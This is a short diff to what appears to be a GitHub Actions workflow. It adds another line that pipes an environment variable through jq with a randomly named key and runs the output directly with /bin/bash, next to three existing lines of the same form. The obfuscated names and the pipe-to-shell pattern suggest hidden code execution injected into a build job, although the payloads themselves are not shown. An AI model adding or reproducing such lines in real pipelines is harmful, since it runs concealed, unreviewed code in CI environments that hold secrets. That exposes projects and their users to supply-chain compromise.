@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$pckey0" | jq -r .phxgd0 | /bin/bash
           echo $ozuu8755 | jq -r .xxl3 | /bin/bash
           echo $clv963 | jq -r .o79740 | /bin/bash
+          printf '%s' "$fw8851" | jq -r .ckf498 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
